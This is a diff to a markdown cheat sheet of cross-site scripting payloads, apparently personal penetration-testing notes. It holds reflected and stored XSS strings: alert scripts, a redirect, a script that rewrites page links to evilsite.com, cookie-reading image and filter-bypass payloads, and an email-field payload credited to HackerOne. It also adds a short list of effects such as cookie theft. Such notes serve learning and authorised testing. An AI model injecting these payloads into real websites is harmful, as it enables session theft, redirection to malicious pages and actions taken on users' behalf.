@@ -42,8 +42,14 @@ attacker
 ## Cross site scripting (XSS)
 ## XSS(Reflected)
 ### Basic XSS
+  * Testing.  
+      check if html tags are processed --> if <b> tags will be removed then your good to go next step
+    Eg.
+    
+           <b> testing</b>
 
-    <script>alert('Hello XSS')</script>
+        <script>alert('Hello XSS')</script>
+    
   * redirecting 
            
           <script>document.location = "http://google.com"</script>
@@ -54,13 +60,13 @@ attacker
  ### More Complex XSS
  * changing elements in the DOM --> It will change the 17th tag to point to evilsite.com
   
-        <script>
-        window.onload = function() {
-          s=document.getElementsByTagName("a")[17];
-          s.href="http://evilsite.com";
-          s.text="http://evilsite.com";s.style.color="red";
-           }
-        </script>
+           <script>
+           window.onload = function() {
+             s=document.getElementsByTagName("a")[17];
+             s.href="http://evilsite.com";
+             s.text="http://evilsite.com";s.style.color="red";
+              }
+           </script>
     
    * url encoded aove script  
    
@@ -83,13 +89,19 @@ attacker
 ## XSS(Stored)
 *  website allows users to submit comments on blog posts, which are displayed to other users. It executes when user visits that site
    
-        <script>alert(document.cookie)</script>
-        <IMG src=1 onerror=alert(document.cookie)>
-        <scr<script>ipt>alert(document.cookie)</script>
+     
+          <script>alert(document.cookie)</script>
+          <IMG src=1 onerror=alert(document.cookie)>
+          <scr<script>ipt>alert(document.cookie)</script>
+        
  ## XSS from HACKERONE
    * Stored email contact like below in general account settings 
      It is stored xss
      
           luc1d"><img/src="x"onerror=alert(document.domain)>@wearehackerone.com
-    
+#### Effects of XSS
+   * Stealing a cookie who will trigger XSS
+   * redirecting to malicios pages
+   * making request on behalf of the user who triggered the xss
+   * DOM based attacks. Example changing the link/adding.. pointing to malicious.com
  
